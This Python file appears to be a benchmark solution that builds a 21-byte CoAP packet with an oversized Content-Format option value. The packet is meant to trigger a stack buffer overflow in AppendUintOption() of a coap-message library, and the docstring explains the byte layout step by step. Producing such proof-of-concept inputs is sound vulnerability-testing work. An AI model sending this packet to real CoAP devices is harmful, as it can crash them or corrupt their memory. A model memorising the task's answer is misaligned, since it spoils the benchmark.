import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow in coap-message.
        
        The vulnerability exists in AppendUintOption() when handling a Uint option
        with an excessive length. The ground truth length is 21 bytes.
        
        CoAP Packet Structure for 21 bytes:
        1. Header (4 bytes): Ver=1, T=0, TKL=0, Code=1 (GET), MsgID=0
           b'\x40\x01\x00\x00'
        2. Option (17 bytes):
           We target a Uint option, e.g., Content-Format (Delta 12).
           We supply a value length of 15 bytes to trigger the overflow (typically > 8 bytes).
           
           Option Header (1 byte): (Delta << 4) | Length_Nibble
           Delta = 12 (0xC)
           We need Length = 15. Since 15 > 12, we use Length_Nibble = 13 (0xD).
           Byte = 0xCD.
           
           Extended Length (1 byte):
           Total Length = 13 + ExtLen.
           15 = 13 + 2.
           Byte = 0x02.
           
           Option Value (15 bytes):
           b'A' * 15
           
        Total: 4 + 1 + 1 + 15 = 21 bytes.
        """
        
        # CoAP Header: Ver(1)|T(0)|TKL(0) = 0x40, Code=0x01, MsgID=0x0000
        header = b'\x40\x01\x00\x00'
        
        # Option: Delta=12, Length=15
        # 0xCD: Delta=12, Len=13 (indicates 1 byte extension)
        # 0x02: Extended length value (13 + 2 = 15)
        option_header = b'\xCD\x02'
        
        # Payload causing overflow
        overflow_value = b'A' * 15
        
        return header + option_header + overflow_value